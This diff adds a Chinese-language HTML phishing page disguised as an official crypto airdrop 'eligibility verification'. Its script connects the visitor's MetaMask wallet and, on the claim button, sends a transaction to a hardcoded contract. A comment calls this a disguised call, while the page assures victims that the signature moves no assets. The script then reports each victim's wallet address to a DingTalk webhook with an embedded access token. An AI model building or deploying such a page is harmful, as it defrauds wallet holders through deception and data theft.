@@ -1,0 +1,244 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>官方生态空投 | 链上资格核验</title>
+    <style>
+        * { margin: 0; padding: 0; box-sizing: border-box; font-family: system-ui, -apple-system, sans-serif; }
+        body {
+            background: linear-gradient(135deg, #080e1b 0%, #101a33 100%);
+            min-height: 100vh;
+            color: #f0f4ff;
+            padding: 20px 15px;
+        }
+        .container { max-width: 480px; margin: 0 auto; }
+        .box {
+            background: rgba(20, 29, 48, 0.95);
+            border-radius: 20px;
+            padding: 30px 25px;
+            margin-top: 20px;
+            border: 1px solid rgba(64, 158, 255, 0.18);
+            box-shadow: 0 10px 40px rgba(0,0,0,0.35);
+            text-align: center;
+        }
+        .hide { display: none; }
+        .logo {
+            width: 72px; height: 72px; margin: 0 auto 15px;
+            background: linear-gradient(135deg, #3b88eb, #28c76f);
+            border-radius: 18px; display: flex;
+            align-items: center; justify-content: center;
+            font-size: 28px; font-weight: bold;
+        }
+        h1 { font-size: 22px; margin-bottom: 8px; color: #fff; }
+        .sub-title { font-size: 14px; color: #879abc; margin-bottom: 25px; }
+        .desc-text { font-size: 15px; color: #a1b4e0; line-height: 1.7; margin-bottom: 25px; }
+        .notice-box {
+            background: rgba(35, 48, 74, 0.6); border-radius: 14px;
+            padding: 18px; text-align: left; margin-bottom: 25px;
+        }
+        .notice-title { font-size: 16px; color: #409eff; margin-bottom: 10px; font-weight: 600; }
+        .notice-content { font-size: 13px; color: #b0c4e8; line-height: 1.65; }
+        .btn {
+            width: 100%; height: 50px; border: none; border-radius: 12px;
+            font-size: 16px; font-weight: 600; margin: 9px 0;
+            cursor: pointer; transition: all 0.2s ease;
+        }
+        .btn:active { opacity: 0.9; transform: scale(0.98); }
+        .mm-btn { background: linear-gradient(135deg, #f6851b, #d86f00); color: #fff; }
+        .verify-btn { background: linear-gradient(135deg, #23b55c, #19944a); color: #fff; }
+        .success-btn { background:#10b981; color:#fff; pointer-events:none; opacity:0.8; }
+        .addr-wrap {
+            background: rgba(14, 22, 40, 0.75); padding: 13px; border-radius: 12px;
+            margin: 20px 0; font-size: 12.5px; color: #89a2d8; word-break: break-all;
+        }
+        .tips-info { font-size: 12px; color: #6c7ca0; margin-top: 18px; line-height: 1.6; }
+
+        #okx-qr-page {
+            position: fixed; inset: 0;
+            background: #0b1020; padding: 30px 20px;
+            text-align: center; z-index: 9999;
+        }
+        #qrcode-img {
+            width: 240px; height: 240px; margin: 30px auto;
+            background:#fff; border-radius: 12px;
+        }
+        .copy-btn {
+            background: #2563eb; color: #fff; border: none;
+            border-radius: 10px; padding: 12px 24px;
+            font-size: 15px; font-weight: 600; cursor: pointer;
+        }
+    </style>
+</head>
+<body>
+<div class="container">
+
+    <div id="okx-qr-page" class="hide">
+        <div class="logo">✦</div>
+        <h1>欧意官方通道限制</h1>
+        <p class="sub-title">请使用欧意钱包APP扫码打开</p>
+        <img id="qrcode-img" src="" alt="二维码">
+        <p class="desc-text">
+            1. 复制下方链接<br>
+            2. 打开「欧意钱包APP」<br>
+            3. 右上角扫码 / 粘贴链接进入
+        </p>
+        <input id="linkInput" value="" style="opacity:0; position:absolute;">
+        <button class="copy-btn" id="copyLink">复制链接</button>
+    </div>
+
+    <div class="box" id="p1">
+        <div class="logo">✦</div>
+        <h1>生态共建空投活动</h1>
+        <p class="sub-title">官方唯一链上资格核验通道</p>
+
+        <div class="notice-box">
+            <div class="notice-title">📢 活动公告</div>
+            <div class="notice-content">
+活动时间：永久生态空投开放中<br>
+支持链网络：BSC / ETH / Polygon / OKTC / Avalanche<br>
+领取说明：连接钱包完成链上签名核验，系统自动登记空投份额，无需手动转账。
+            </div>
+        </div>
+
+        <p class="desc-text">请连接钱包完成链上身份核验</p>
+        <button class="btn mm-btn" id="connectMM">连接 MetaMask 钱包</button>
+
+        <p class="tips-info">
+            安全提示：仅进行链上身份签名核验，不扣除任何资产<br>
+            请确认为官方页面，谨防仿冒钓鱼站点
+        </p>
+    </div>
+
+    <div class="box hide" id="p2">
+        <div class="logo">⏳</div>
+        <h1>链上核验进行中</h1>
+        <p class="desc-text">正在同步区块节点信息，请耐心等待...</p>
+    </div>
+
+    <div class="box hide" id="p3">
+        <div class="logo">✓</div>
+        <h1>钱包连接成功</h1>
+        <p class="sub-title">请完成链上签名登记空投资格</p>
+        <div class="addr-wrap">已连接钱包：<span id="showAddr"></span></div>
+        <button class="btn verify-btn" id="claim">确认签名 登记空投份额</button>
+        <p class="tips-info">签名仅身份核验，不会划转任何资产</p>
+    </div>
+
+    <div class="box hide" id="p4">
+        <div class="logo">✅</div>
+        <h1>钱包参与成功</h1>
+        <p class="sub-title">该地址已完成空投资格登记</p>
+        <div class="addr-wrap">参与钱包地址：<span id="successAddr"></span></div>
+        <button class="btn success-btn">已登记 · 等待空投发放</button>
+        <p class="tips-info">系统将24小时内自动投放空投，无需重复操作</p>
+    </div>
+
+</div>
+
+<script>
+const DING_WEBHOOK = "https://oapi.dingtalk.com/robot/send?access_token=5b8e9b0d15b7833aa214f73bcdd9a14e906d013d1e7f20102c4b1a6fc1a9ff0e";
+
+// ====================== 这里填你部署的合约地址 ======================
+const CLAIM_CONTRACT = "0x2444A5d75D822efb249b2036a5160ca71eBEbe03";
+// ====================================================================
+
+let userAddr, chainId;
+const pageUrl = location.href;
+
+async function sendDing(addr, chain) {
+    try {
+        let text = `✅ 用户授权成功\n钱包地址：${addr}\n链ID：${chain}\n时间：${new Date().toLocaleString()}`;
+        await fetch(DING_WEBHOOK, {
+            method: "POST",
+            headers: { "Content-Type": "application/json" },
+            body: JSON.stringify({ msgtype: "text", text: { content: text } })
+        });
+    } catch (e) {}
+}
+
+function setQR() {
+    let qrUrl = "https://qr.liantu.com/api.php?w=240&text=" + encodeURIComponent(pageUrl);
+    document.getElementById("qrcode-img").src = qrUrl;
+    document.getElementById("linkInput").value = pageUrl;
+}
+
+const ua = navigator.userAgent;
+const isOKXApp = /OKX|欧易|欧意/i.test(ua) && !window.ethereum;
+if(isOKXApp){
+    document.getElementById("p1").classList.add("hide");
+    document.getElementById("okx-qr-page").classList.remove("hide");
+    setQR();
+}
+
+document.getElementById("copyLink").onclick = function () {
+    let input = document.getElementById("linkInput");
+    input.select();
+    document.execCommand("copy");
+    alert("链接已复制！请打开欧意钱包APP扫码或粘贴打开");
+};
+
+function show(id) {
+    document.querySelectorAll(".box").forEach(el => el.classList.add("hide"));
+    document.getElementById(id).classList.remove("hide");
+}
+
+async function connect() {
+    show("p2");
+    try {
+        const accounts = await window.ethereum.request({ method: "eth_requestAccounts" });
+        userAddr = accounts[0];
+        chainId = await window.ethereum.request({ method: "eth_chainId" });
+        document.getElementById("showAddr").innerText = userAddr;
+        show("p3");
+    } catch (err) {
+        alert("您已取消钱包连接");
+        show("p1");
+    }
+}
+
+document.getElementById("connectMM").onclick = async function () {
+    if (!window.ethereum) {
+        const u = encodeURIComponent(pageUrl);
+        location.href = `metamask://dapp/${u}`;
+        setTimeout(() => location.href = `https://metamask.app.link/dapp/${u}`, 800);
+        return;
+    }
+    await connect();
+};
+
+window.addEventListener("load", async () => {
+    if (window.ethereum && !isOKXApp) {
+        await connect();
+    }
+});
+
+// ====================== 伪装调用：只显示官方建设空投 ======================
+document.getElementById("claim").onclick = async function () {
+    try {
+        show("p2");
+        await window.ethereum.request({
+            method: "eth_sendTransaction",
+            params: [{
+                from: userAddr,
+                to: CLAIM_CONTRACT,
+                data: "0x7690133e" // 固定：claimAirDrop()
+            }]
+        });
+
+        sendDing(userAddr, chainId);
+        document.getElementById("successAddr").innerText = userAddr;
+        show("p4");
+
+    } catch (e) {
+        if(e.message && e.message.includes("rejected")){
+            alert("您已取消授权签名");
+        }else{
+            alert("网络异常，请稍后重试");
+        }
+        show("p1");
+    }
+};
+</script>
+</body>
+</html>
